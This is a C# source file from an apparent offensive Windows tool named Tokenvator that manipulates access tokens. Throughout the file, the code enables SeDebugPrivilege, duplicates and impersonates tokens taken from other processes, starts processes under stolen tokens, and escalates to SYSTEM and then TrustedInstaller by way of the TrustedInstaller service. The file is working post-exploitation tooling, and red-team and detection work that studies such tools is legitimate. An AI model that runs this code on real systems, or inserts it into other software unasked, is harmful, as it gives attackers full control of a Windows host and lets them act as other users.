using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;

namespace Tokenvator
{
    class Tokens : IDisposable
    {
        protected IntPtr phNewToken;
        protected IntPtr hExistingToken;
        private IntPtr currentProcessToken;
        private Dictionary<UInt32, String> processes;

        private delegate Boolean Create(IntPtr phNewToken, String newProcess, String arguments); 

        private static List<String> validPrivileges = new List<string> { "SeAssignPrimaryTokenPrivilege", 
            "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", 
            "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", 
            "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege", 
            "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", 
            "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", 
            "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", 
            "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", 
            "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", 
            "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", 
            "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", 
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };

        ////////////////////////////////////////////////////////////////////////////////
        // Default Constructor
        ////////////////////////////////////////////////////////////////////////////////
        public Tokens()
        {
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();
            processes = new Dictionary<UInt32, String>();
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Console.WriteLine("[-] Administrator privileges required");
            }

            currentProcessToken = new IntPtr();
            kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
            SetTokenPrivilege(ref currentProcessToken, Constants.SE_DEBUG_NAME);
        }

        protected Tokens(Boolean rt)
        {
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();
            processes = new Dictionary<UInt32, String>();

            currentProcessToken = new IntPtr();
            kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
        }

        public void Dispose()
        {
            kernel32.CloseHandle(phNewToken);
            kernel32.CloseHandle(hExistingToken);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Default Destructor
        ////////////////////////////////////////////////////////////////////////////////
        ~Tokens()
        {
            Dispose();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Calls CreateProcessWithTokenW
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean StartProcessAsUser(Int32 processId, String newProcess)
        {
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            Structs._SECURITY_ATTRIBUTES securityAttributes = new Structs._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED,
                        ref securityAttributes,
                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Enums.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetError("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: " + phNewToken.ToInt32());

            Create createProcess;
            if (0 == Process.GetCurrentProcess().SessionId)
            {
                createProcess = CreateProcess.CreateProcessWithLogonW;
            }
            else
            {
                createProcess = CreateProcess.CreateProcessWithTokenW;
            }

            if (!createProcess(phNewToken, newProcess, ""))
            {
                return false;
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Impersonates the token from a specified processId
        ////////////////////////////////////////////////////////////////////////////////
        public virtual Boolean ImpersonateUser(Int32 processId)
        {
            Console.WriteLine("[*] Impersonating {0}", processId);
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            Structs._SECURITY_ATTRIBUTES securityAttributes = new Structs._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED,
                        ref securityAttributes,
                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Enums.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetError("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: {0}", phNewToken.ToInt32());
            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
            {
                GetError("ImpersonateLoggedOnUser: ");
                return false;
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Creates a new process as SYSTEM
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetSystem(String newProcess)
        {
            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));

            Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
            processes = Enumeration.EnumerateUserProcesses(false, systemAccount.ToString());
            
            foreach (UInt32 process in processes.Keys)
            {
                if (StartProcessAsUser((Int32)process, newProcess))
                {
                    return true;
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Elevates current process to SYSTEM
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetSystem()
        {
            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));

            Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
            processes = Enumeration.EnumerateUserProcesses(false, systemAccount.ToString());
            
            foreach (UInt32 process in processes.Keys)
            {
                if (ImpersonateUser((Int32)process))
                {
                    return true;
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Creates a process as SYSTEM w/ Trusted Installer Group
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetTrustedInstaller(String newProcess)
        {
            Console.WriteLine("[+] Getting NT AUTHORITY\\SYSTEM privileges");
            GetSystem();
            Console.WriteLine(" [*] Running as: {0}", WindowsIdentity.GetCurrent().Name);
            
            Services services = new Services("TrustedInstaller");
            if (!services.StartService())
            {
                GetError("StartService");
                return false;
            }

            if (!StartProcessAsUser((Int32)services.GetServiceProcessId(), newProcess))
            {
                GetError("StartProcessAsUser");
                return false;
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Elevates current process to SYSTEM w/ Trusted Installer Group
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetTrustedInstaller()
        {
            Console.WriteLine("[*] Getting NT AUTHORITY\\SYSTEM privileges");
            GetSystem();
            Console.WriteLine(" [+] Running as: " + WindowsIdentity.GetCurrent().Name);

            Services services = new Services("TrustedInstaller");
            if (!services.StartService())
            {
                GetError("StartService");
                return false;
            }

            if (!ImpersonateUser((Int32)services.GetServiceProcessId()))
            {
                GetError("ImpersonateUser");
                return false;
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets hToken to a processes primary token
        ////////////////////////////////////////////////////////////////////////////////
        public virtual Boolean GetPrimaryToken(UInt32 processId, String name)
        {
            //Originally Set to true
            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, true, processId);
            if (hProcess == IntPtr.Zero)
            {
                return false;
            }
            Console.WriteLine("[+] Recieved Handle for: " + name + " (" + processId + ")");
            Console.WriteLine(" [+] Process Handle: " + hProcess.ToInt32());

            if (!kernel32.OpenProcessToken(hProcess, Constants.TOKEN_ALT, out hExistingToken))
            {
                return false;   
            }
            Console.WriteLine(" [+] Primary Token Handle: " + hExistingToken.ToInt32());
            kernel32.CloseHandle(hProcess);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Opens a thread token
        ////////////////////////////////////////////////////////////////////////////////
        private static IntPtr OpenThreadTokenChecked()
        {
            IntPtr hToken = new IntPtr();
            Console.WriteLine("[*] Opening Thread Token");
            if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
            {
                Console.WriteLine(" [-] OpenTheadToken Failed");
                Console.WriteLine(" [*] Impersonating Self");
                if (!advapi32.ImpersonateSelf(Enums.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
                {
                    GetError("ImpersonateSelf");
                    return IntPtr.Zero;
                }
                Console.WriteLine(" [+] Impersonated Self");
                Console.WriteLine(" [*] Retrying");
                if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
                {
                    GetError("OpenThreadToken");
                    return IntPtr.Zero;
                }
            }
            Console.WriteLine(" [+] Recieved Thread Token Handle: " + hToken.ToInt32());
            return hToken;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets a Token to have a specified privilege
        // http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        // https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        ////////////////////////////////////////////////////////////////////////////////
        public static void UnSetTokenPrivilege(ref IntPtr hToken, String privilege)
        {
            Console.WriteLine("[*] Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            Structs._LUID luid = new Structs._LUID();
            if (!advapi32.LookupPrivilegeValue(null, privilege, ref luid))
            {
                GetError("LookupPrivilegeValue");
                return;
            }
            Console.WriteLine(" [+] Recieved luid");

            ////////////////////////////////////////////////////////////////////////////////
            Structs._LUID_AND_ATTRIBUTES luidAndAttributes = new Structs._LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = 0;

            Structs._TOKEN_PRIVILEGES newState = new Structs._TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Structs._TOKEN_PRIVILEGES previousState = new Structs._TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            Console.WriteLine(" [+] AdjustTokenPrivilege Pass 1");
            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                GetError("AdjustTokenPrivileges - 1");
                return;
            }

            previousState.Privileges.Attributes ^= (Constants.SE_PRIVILEGE_ENABLED & previousState.Privileges.Attributes);


            ////////////////////////////////////////////////////////////////////////////////
            Structs._TOKEN_PRIVILEGES kluge = new Structs._TOKEN_PRIVILEGES();
            Console.WriteLine(" [+] AdjustTokenPrivilege Pass 2");
            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref previousState, (UInt32)Marshal.SizeOf(previousState), ref kluge, out returnLength))
            {
                GetError("AdjustTokenPrivileges - 2");
                return;
            }

            Console.WriteLine(" [+] Adjusted Token to: " + privilege);
            return;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets a Token to have a specified privilege
        // http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        // https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        ////////////////////////////////////////////////////////////////////////////////
        public static void SetTokenPrivilege(ref IntPtr hToken, String privilege)
        {
            if (!validPrivileges.Contains(privilege))
            {
                Console.WriteLine("[-] Invalid Privilege Specified");
                return;
            }
            Console.WriteLine("[*] Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            Structs._LUID luid = new Structs._LUID();
            if (!advapi32.LookupPrivilegeValue(null, privilege, ref luid))
            {
                GetError("LookupPrivilegeValue");
                return;
            }
            Console.WriteLine(" [+] Received luid");

            ////////////////////////////////////////////////////////////////////////////////
            Structs._LUID_AND_ATTRIBUTES luidAndAttributes = new Structs._LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = Constants.SE_PRIVILEGE_ENABLED;

            Structs._TOKEN_PRIVILEGES newState = new Structs._TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Structs._TOKEN_PRIVILEGES previousState = new Structs._TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            Console.WriteLine(" [*] AdjustTokenPrivilege");
            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                GetError("AdjustTokenPrivileges");
                return;
            }

            Console.WriteLine(" [+] Adjusted Token to: " + privilege);
            return;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Prints the tokens privileges
        ////////////////////////////////////////////////////////////////////////////////
        public static void EnumerateTokenPrivileges(IntPtr hToken)
        {
            ////////////////////////////////////////////////////////////////////////////////
            UInt32 TokenInfLength = 0;
            Console.WriteLine("[*] Enumerating Token Privileges");
            advapi32.GetTokenInformation(
                hToken, 
                Enums._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
                IntPtr.Zero, 
                TokenInfLength, 
                out TokenInfLength
            );

            if (TokenInfLength < 0 || TokenInfLength > Int32.MaxValue)  
            {
                GetError("GetTokenInformation - 1 " + TokenInfLength);
                return;
            }
            Console.WriteLine("[*] GetTokenInformation - Pass 1");
            IntPtr lpTokenInformation = Marshal.AllocHGlobal((Int32)TokenInfLength) ;
            
            ////////////////////////////////////////////////////////////////////////////////
            if (!advapi32.GetTokenInformation(
                hToken, 
                Enums._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
                lpTokenInformation, 
                TokenInfLength, 
                out TokenInfLength))
            {
                GetError("GetTokenInformation - 2" + TokenInfLength);
                return;
            }
            Console.WriteLine("[*] GetTokenInformation - Pass 2");
            Structs._TOKEN_PRIVILEGES_ARRAY tokenPrivileges = (Structs._TOKEN_PRIVILEGES_ARRAY)Marshal.PtrToStructure(lpTokenInformation, typeof(Structs._TOKEN_PRIVILEGES_ARRAY));
            Console.WriteLine("[+] Enumerated " + tokenPrivileges.PrivilegeCount + " Privileges");

            Console.WriteLine();
            Console.WriteLine("{0,-30}{1,-30}", "Privilege Name", "Enabled");
            Console.WriteLine("{0,-30}{1,-30}", "--------------", "-------");
            ////////////////////////////////////////////////////////////////////////////////
            for (Int32 i = 0; i < tokenPrivileges.PrivilegeCount; i++)
            {
                StringBuilder lpName = new StringBuilder();
                Int32 cchName = 0;
                IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(tokenPrivileges.Privileges[i]));
                Marshal.StructureToPtr(tokenPrivileges.Privileges[i].Luid, lpLuid, true);

                advapi32.LookupPrivilegeName(null, lpLuid, null, ref cchName);
                if (cchName < 0 || cchName > Int32.MaxValue)  
                {
                    GetError("LookupPrivilegeName " + cchName);
                    return;
                }

                lpName.EnsureCapacity(cchName + 1);
                if (!advapi32.LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
                {
                    Console.WriteLine("[-] Privilege Name Lookup Failed");
                    continue;
                }

                Structs._PRIVILEGE_SET privilegeSet = new Structs._PRIVILEGE_SET();
                privilegeSet.PrivilegeCount = 1;
                privilegeSet.Control = Structs.PRIVILEGE_SET_ALL_NECESSARY;
                privilegeSet.Privilege = new Structs._LUID_AND_ATTRIBUTES[] { tokenPrivileges.Privileges[i] };

                IntPtr pfResult;
                if (!advapi32.PrivilegeCheck(hToken, privilegeSet, out pfResult))
                {
                    Console.WriteLine("[-] Privilege Check Failed");
                    continue;
                }
                Console.WriteLine("{0,-30}{1,-30}", lpName.ToString(), Convert.ToBoolean(pfResult.ToInt32()));

                Marshal.FreeHGlobal(lpLuid);
            }
            Console.WriteLine();
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        protected static void GetError(String location)
        {
            Console.WriteLine(" [-] Function " + location + " failed: " + Marshal.GetLastWin32Error());
        }
    }
}
